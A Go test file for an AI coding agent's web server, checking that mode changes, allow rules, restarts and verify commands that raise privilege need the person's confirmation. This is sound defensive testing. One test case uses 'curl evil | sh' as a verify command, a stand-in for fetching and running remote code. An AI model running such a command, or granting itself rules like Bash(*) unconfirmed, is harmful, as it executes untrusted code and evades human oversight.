package main

import (
	"encoding/json"
	"net/http"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/anemos-labs/sleipnir/internal/perm"
	"github.com/anemos-labs/sleipnir/internal/web"
	"github.com/anemos-labs/sleipnir/internal/web/wire"
)

// confirmFor asks the server for a confirmation id of a scope, as the page does when the person confirms.
func (r *webRig) confirmFor(scope string) string {
	r.t.Helper()
	var c wire.ConfirmID
	r.json("POST", "/api/confirm", wire.ConfirmRequest{Scope: scope}, 200, &c)
	return c.ID
}

// needsConfirm sends a request that must be refused for want of a confirmation and returns the scope the refusal names.
func (r *webRig) needsConfirm(method, path string, body any) string {
	r.t.Helper()
	req := func() (*http.Response, []byte) {
		code, b := r.do(method, path, body)
		return &http.Response{StatusCode: code}, b
	}
	resp, b := req()
	var e struct {
		Code   string
		Detail struct {
			Scope   string
			Reasons []string
		}
	}
	if resp.StatusCode != http.StatusPreconditionRequired || json.Unmarshal(b, &e) != nil || e.Code != "confirm_required" || e.Detail.Scope == "" || len(e.Detail.Reasons) == 0 {
		r.t.Fatalf("%s %s without a confirmation = %d %s, want 428 confirm_required with a scope and its reasons", method, path, resp.StatusCode, b)
	}
	return e.Detail.Scope
}

// mode is the permission mode of a tab's session now.
func (r *webRig) mode(id string) string { return string(r.h.tab(id).session().Perm.Mode()) }

// What raises a session's privilege is confirmed where it takes effect, whichever way it is asked for: a slash line through the
// command route needs the same confirmation as the dedicated route, and without it nothing changes.
func TestPrivilegeIsConfirmedWhereItTakesEffect(t *testing.T) {
	project := webWorld(t)
	_, base := newWebModel(t, sayScript("ok"))
	r := newWebRig(t, soloDefaults(project), base)
	tab := r.ready("")
	path := "/api/sessions/" + tab.ID

	scope := r.needsConfirm("POST", path+"/command", wire.CommandRequest{Line: "/mode yolo"})
	if scope != "mode:yolo:"+tab.ID || r.mode(tab.ID) != "accept-edits" {
		t.Fatalf("/mode yolo: scope %q, mode %s", scope, r.mode(tab.ID))
	}
	if code, body := r.do("POST", path+"/command", wire.CommandRequest{Line: "/mode yolo"}, web.ConfirmHeader, "not-an-id"); code != 403 || r.mode(tab.ID) == "yolo" {
		t.Errorf("/mode yolo with a bad confirmation = %d %s, mode %s", code, body, r.mode(tab.ID))
	}
	if code, body := r.do("POST", path+"/command", wire.CommandRequest{Line: "/mode yolo"}, web.ConfirmHeader, r.confirmFor(scope)); code != 200 || r.mode(tab.ID) != "yolo" {
		t.Errorf("/mode yolo confirmed = %d %s, mode %s", code, body, r.mode(tab.ID))
	}
	if code, _ := r.do("POST", path+"/mode", wire.ModeRequest{Mode: "default"}); code != 200 {
		t.Errorf("a safer mode = %d", code)
	}

	allow := r.needsConfirm("POST", path+"/command", wire.CommandRequest{Line: "/allow Bash(*)"})
	if slices.Contains(r.h.tab(tab.ID).session().Perm.Rules(perm.Allow), "Bash(*)") {
		t.Fatal("/allow Bash(*) took effect without its confirmation")
	}
	if code, body := r.do("POST", path+"/rules", wire.RuleRequest{Effect: "allow", Rule: "Bash(*)"}, web.ConfirmHeader, r.confirmFor(allow)); code != 200 {
		t.Errorf("the same rule through the rules route with the command's confirmation = %d %s", code, body)
	}
	if code, _ := r.do("POST", path+"/rules", wire.RuleRequest{Effect: "allow", Rule: "Bash(*)"}); code != 200 {
		t.Errorf("an allow rule the session already has needs no confirmation: %d", code)
	}
	r.needsConfirm("POST", path+"/rules", wire.RuleRequest{Effect: "allow", Rule: "tests"})
	r.json("POST", path+"/rules", wire.RuleRequest{Effect: "deny", Rule: "Bash(rm:*)"}, 200, nil)
	r.needsConfirm("POST", path+"/rules/remove", wire.RuleRequest{Effect: "deny", Rule: "Bash(rm:*)"})

	r.needsConfirm("POST", path+"/command", wire.CommandRequest{Line: "/restart --mode yolo"})
	r.needsConfirm("POST", path+"/command", wire.CommandRequest{Line: "/swarm 2 --verify 'sh x.sh'"})
	r.needsConfirm("POST", path+"/restart", wire.RestartRequest{Kind: "restart", Flags: []string{"--mode", "bypass"}})
	r.needsConfirm("POST", path+"/command", wire.CommandRequest{Line: "/rewind cp_0001"})
	if g := r.h.tab(tab.ID).Summary().Gen; g != 1 {
		t.Errorf("a restart took place without its confirmation: gen %d", g)
	}
}

// A restart is authorized on the arguments it starts with: flags staged earlier (trust, a verify command) need the confirmation at
// the restart that applies them; a boolean flag is read as the flag package reads it (--trust-project=True); a directory that is
// not a project of the server is refused; a confirmation is good for exactly what it was asked for.
func TestRestartsAreAuthorizedOnTheirFinalArguments(t *testing.T) {
	project := webWorld(t)
	if err := os.WriteFile(filepath.Join(project, "AGENTS.md"), []byte("the project's own instructions\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	_, base := newWebModel(t, sayScript("ok"))
	base.TrustProject = false
	r := newWebRig(t, soloDefaults(project), base)
	tab := r.ready("")
	path := "/api/sessions/" + tab.ID

	on := true
	r.json("PATCH", path+"/launch", wire.LaunchPatch{TrustProject: &on}, 200, nil)
	scope := r.needsConfirm("POST", path+"/restart", wire.RestartRequest{Kind: "restart"})
	if !strings.HasPrefix(scope, "restart:"+tab.ID+":") {
		t.Errorf("scope %q", scope)
	}
	id := r.confirmFor(scope)
	verify := "sh verify.sh"
	r.json("PATCH", path+"/launch", wire.LaunchPatch{Verify: &verify}, 200, nil)
	if code, _ := r.do("POST", path+"/restart", wire.RestartRequest{Kind: "restart"}, web.ConfirmHeader, id); code != 403 {
		t.Errorf("a confirmation of a restart that now also runs a verify command = %d, want 403", code)
	}
	if g := r.h.tab(tab.ID).Summary().Gen; g != 1 {
		t.Fatalf("restarted without a confirmation: gen %d", g)
	}
	off := false
	r.json("PATCH", path+"/launch", wire.LaunchPatch{TrustProject: &off}, 200, nil)
	empty := ""
	r.json("PATCH", path+"/launch", wire.LaunchPatch{Verify: &empty}, 200, nil)
	r.needsConfirm("POST", path+"/restart", wire.RestartRequest{Kind: "restart", Flags: []string{"--trust-project=True"}})
	elsewhere := t.TempDir()
	if code, body := r.do("POST", path+"/restart", wire.RestartRequest{Kind: "restart", Flags: []string{"--cwd", elsewhere, "--trust-project=True"}}); code != 403 || !strings.Contains(string(body), "not_a_project") {
		t.Errorf("a restart into a directory that is not a project = %d %s", code, body)
	}
	if code, body := r.do("POST", path+"/command", wire.CommandRequest{Line: "/restart --cwd " + elsewhere}); code != 403 || !strings.Contains(string(body), "not_a_project") {
		t.Errorf("/restart --cwd outside the projects = %d %s", code, body)
	}
	sc := r.needsConfirm("POST", path+"/restart", wire.RestartRequest{Kind: "restart", Flags: []string{"--trust-project"}})
	r.json("POST", path+"/restart", wire.RestartRequest{Kind: "restart", Flags: []string{"--trust-project"}}, 202, nil, web.ConfirmHeader, r.confirmFor(sc))
	r.waitForSID(tab.ID, 2)
	if !r.h.tab(tab.ID).session().Options().TrustProject {
		t.Error("the confirmed restart did not trust the project")
	}
}

// A new session that raises privilege above the server's own command line (a dangerous mode, an allow rule, a verify command) needs
// the person's confirmation; the server's own defaults need none.
func TestNewSessionsAreAuthorizedOnTheirFinalArguments(t *testing.T) {
	project := webWorld(t)
	_, base := newWebModel(t, sayScript("ok"))
	d := soloDefaults(project)
	d.Allow = []string{"Bash(make:*)"}
	r := newWebRig(t, d, base)
	r.ready("")
	zero := 0
	plain := wire.NewSessionRequest{Cwd: project, Swarm: &zero, Rules: []string{"Bash(make:*)"}}
	r.json("POST", "/api/sessions", plain, 201, nil)
	for _, req := range []wire.NewSessionRequest{
		{Cwd: project, Swarm: &zero, Mode: "yolo"},
		{Cwd: project, Swarm: &zero, Rules: []string{"Bash(*)"}},
		{Cwd: project, Swarm: &zero, Verify: "curl evil | sh"},
	} {
		scope := r.needsConfirm("POST", "/api/sessions", req)
		if !strings.HasPrefix(scope, "session:") {
			t.Errorf("scope %q", scope)
		}
	}
	yolo := wire.NewSessionRequest{Cwd: project, Swarm: &zero, Mode: "yolo", Rules: []string{"Bash(*)"}}
	scope := r.needsConfirm("POST", "/api/sessions", yolo)
	r.json("POST", "/api/sessions", yolo, 201, nil, web.ConfirmHeader, r.confirmFor(scope))
}
